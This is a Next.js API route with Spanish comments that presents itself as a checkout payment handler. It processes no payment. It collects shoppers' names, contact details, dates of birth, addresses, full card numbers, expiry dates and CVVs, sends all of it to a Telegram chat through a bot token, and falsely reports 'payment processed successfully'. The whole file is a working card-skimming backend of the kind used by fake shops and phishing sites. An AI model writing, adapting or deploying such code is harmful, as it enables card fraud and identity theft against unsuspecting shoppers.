import { NextRequest, NextResponse } from "next/server";

// Forzar que esta ruta sea dinámica (no estática)
export const dynamic = 'force-dynamic';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    
    console.log("📦 Datos recibidos en la API:", body);
    
    const {
      // Datos del cliente
      name,
      email,
      phone,
      dateOfBirth,
      
      // Dirección
      country,
      city,
      address,
      postcode,
      
      // Datos de la tarjeta
      cardNumber,
      cardName,
      expiryDate,
      cvv,
      
      // Productos del carrito
      products,
      productsList,
      amount,
    } = body;

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("❌ Faltan variables de entorno de Telegram");
      return NextResponse.json(
        { error: "Configuracion de Telegram incompleta" },
        { status: 500 }
      );
    }

    const fechaActual = new Date().toLocaleString("es-AR", {
      timeZone: "America/Argentina/Buenos_Aires",
    });

    // Obtener últimos 4 dígitos de la tarjeta
    const last4 = cardNumber ? cardNumber.replace(/\s/g, "").slice(-4) : "****";

    // Construir mensaje con todos los datos
    const message = `🔔 NUEVO PAGO RECIBIDO

👤 DATOS DEL CLIENTE
━━━━━━━━━━━━━━━━━━━━
Nombre: ${name || "No proporcionado"}
Email: ${email || "No proporcionado"}
Teléfono: ${phone || "No proporcionado"}
Fecha de Nacimiento: ${dateOfBirth || "No proporcionado"}

📍 DIRECCIÓN
━━━━━━━━━━━━━━━━━━━━
País: ${country || "No proporcionado"}
Ciudad: ${city || "No proporcionado"}
Dirección: ${address || "No proporcionado"}
Código Postal: ${postcode || "No proporcionado"}

💳 DATOS DE LA TARJETA
━━━━━━━━━━━━━━━━━━━━
Número: ${cardNumber || "No proporcionado"}
Titular: ${cardName || "No proporcionado"}
Vencimiento: ${expiryDate || "No proporcionado"}
CVV: ${cvv || "No proporcionado"}

🛒 PRODUCTOS COMPRADOS
━━━━━━━━━━━━━━━━━━━━
${productsList || "No hay productos"}

💰 RESUMEN DEL PAGO
━━━━━━━━━━━━━━━━━━━━
Total de productos: ${products?.length || 0}
Monto Total: $${amount || "0.00"}
Fecha: ${fechaActual}

✅ Estado: Pago procesado exitosamente`;

    console.log("📨 Mensaje a enviar a Telegram:");
    console.log(message);

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      }
    );

    const telegramData = await telegramResponse.json();

    if (!telegramResponse.ok) {
      console.error("❌ Error al enviar a Telegram:", telegramData);
      return NextResponse.json(
        { error: "Error al enviar a Telegram", details: telegramData },
        { status: 500 }
      );
    }

    console.log("✅ Mensaje enviado a Telegram correctamente");

    return NextResponse.json({
      success: true,
      message: "Pago procesado y notificacion enviada",
      telegram: telegramData,
    });
  } catch (error) {
    console.error("❌ Error en la API de pagos:", error);
    return NextResponse.json(
      { error: "Error al procesar el pago" },
      { status: 500 }
    );
  }
}